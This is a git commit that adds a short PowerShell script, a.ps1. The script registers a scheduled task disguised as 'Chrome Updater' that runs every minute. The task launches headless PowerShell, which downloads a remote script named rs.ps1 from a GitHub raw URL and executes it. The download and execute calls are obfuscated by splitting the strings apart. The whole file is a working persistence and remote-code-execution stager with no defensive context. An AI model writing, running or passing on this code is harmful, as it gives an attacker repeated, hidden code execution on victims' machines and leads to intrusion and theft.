9b378c93e6abe1938286898aec3cf39787061487
mishaplc <57828181+mishaplc@users.noreply.github.com>
2024-01-27 14:36:34 +0100

    Create a.ps1

---
+++ a.ps1
@@ -0,0 +1,3 @@
+$Action = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument "--headless powershell -c `"`$l='http'+'s://raw.githubusercontent.com/mishaplc/tests/main/rs.ps1';(i''wR `$l).content|i''E''x`""
+$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
+Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Chrome Updater"
